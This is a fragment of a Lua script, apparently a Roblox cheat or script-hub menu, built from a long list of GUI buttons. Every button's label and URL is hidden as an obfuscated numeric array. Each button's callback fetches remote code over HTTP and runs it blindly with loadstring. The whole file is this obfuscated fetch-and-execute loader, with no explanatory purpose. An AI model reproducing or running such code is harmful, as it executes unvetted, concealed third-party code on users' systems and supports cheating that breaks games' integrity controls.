        executednotify(__decrypt({126,122,125,19,96,118,114,116,114,103,118,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({105,122,125,118,97,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,103,90,86,93,69,93,2,1,0,71,88,69,93,28,103,86,64,71,28,94,82,90,93,28,105,122,125,118,97,123,102,113,29,95,70,82})))()
        executednotify(__decrypt({105,122,125,118,97,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({126,102,107,102,96,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,126,70,75,70,64,103,127,28,108,84,108,0,90,1,112,82,0,28,94,82,90,93,28,126,70,75,70,64,123,70,81,108,101,1,29,95,70,82})))()
        executednotify(__decrypt({126,102,107,102,96,19,123,70,81}))
   end,
})


_g_3i2Ca3:CreateButton({
   Name = __decrypt({102,65,82,93,90,70,94,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,114,70,84,70,64,71,73,74,73,75,28,102,65,82,93,90,70,94,126,92,81,90,95,86,28,94,82,90,93,28,102,65,82,93,90,70,94,120,82,88,29,95,70,82})))()
        executednotify(__decrypt({102,65,82,93,90,70,94,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({114,73,70,65,86,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,82,67,90,29,95,70,82,65,94,92,65,29,93,86,71,28,85,90,95,86,64,28,69,0,28,95,92,82,87,86,65,64,28,0,81,1,2,5,10,80,85,6,0,81,80,5,2,3,7,87,82,81,86,11,86,2,10,6,5,1,86,6,80,80,1,29,95,70,82})))()
        executednotify(__decrypt({114,73,70,65,86,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({101,86,80,71,92,65,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,103,70,75,92,73,28,101,86,80,71,92,65,123,70,81,28,94,82,90,93,28,113,95,92,75,117,65,70,90,71,99,112,22,1,5,126,124,113,122,127,118})))()
        executednotify(__decrypt({101,86,80,71,92,65,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({100,92,95,85,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,95,90,93,88,29,71,65,68,75,73,29,80,92,94,28,127,96,30,100,92,95,85,30,123,70,81})))()
        executednotify(__decrypt({100,92,95,85,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({99,82,74,81,82,80,88,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,96,80,65,90,67,71,30,113,95,92,75,28,96,80,65,90,67,71,28,94,82,90,93,28,99,82,74,113,82,80,88,29,95,70,82})))()
        executednotify(__decrypt({99,82,74,81,82,80,88,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({97,122,99,99,118,97,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,91,82,89,90,81,86,73,82,28,126,92,87,70,95,86,28,94,82,90,93,28,126,92,81,90,95,86,108,96,80,65,90,67,71,29,95,70,82})))()
        executednotify(__decrypt({97,122,99,99,118,97,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({120,114,106,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,114,107,112,96,80,65,90,67,71,28,120,82,74,126,92,81,90,95,86,28,94,82,90,93,28,96,80,65,90,67,71,30,127,92,82,87,86,65})))()
        executednotify(__decrypt({120,114,106,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({96,118,114,116,114,103,118,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,96,86,82,113,82,81,74,113,117,28,64,86,82,94,82,90,93,28,94,82,90,93,28,96,86,82,116,82,71,86,125,86,75,71,116,86,93,73})))()
        executednotify(__decrypt({96,118,114,116,114,103,118,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({126,114,103,96,102,125,118,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,106,82,71,64,70,65,82,82,28,126,82,71,64,70,93,86,28,94,82,90,93,28,126,82,71,64,70,93,86,81,86,71,82,29,95,70,82})))()
        executednotify(__decrypt({126,114,103,96,102,125,118,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({126,122,125,19,96,118,114,116,114,103,118,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,112,91,86,86,94,64,125,91,70,112,91,90,114,95,28,126,90,93,116,82,94,90,93,84,123,70,81,28,94,82,90,93,28,94,90,93,84,82,94,90,93,84,70,67,87,82,71,86,93,86,68})))()
        executednotify(__decrypt({126,122,125,19,96,118,114,116,114,103,118,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({105,122,125,118,97,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,103,90,86,93,69,93,2,1,0,71,88,69,93,28,103,86,64,71,28,94,82,90,93,28,105,122,125,118,97,123,102,113,29,95,70,82})))()
        executednotify(__decrypt({105,122,125,118,97,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({126,102,107,102,96,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,126,70,75,70,64,103,127,28,108,84,108,0,90,1,112,82,0,28,94,82,90,93,28,126,70,75,70,64,123,70,81,108,101,1,29,95,70,82})))()
        executednotify(__decrypt({126,102,107,102,96,19,123,70,81}))
   end,
})

_g_3i2Ca3:CreateButton({
   Name = __decrypt({126,122,125,19,116,97,118,118,125,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,113,82,64,90,80,82,95,95,74,74,81,86,71,82,28,94,82,90,93,28,94,82,90,93,28,126,90,93,84,82,94,90,93,84,29,95,70,82})))()
        executednotify(__decrypt({126,122,125,19,116,97,118,118,125,19,123,70,81}))
   end,
})
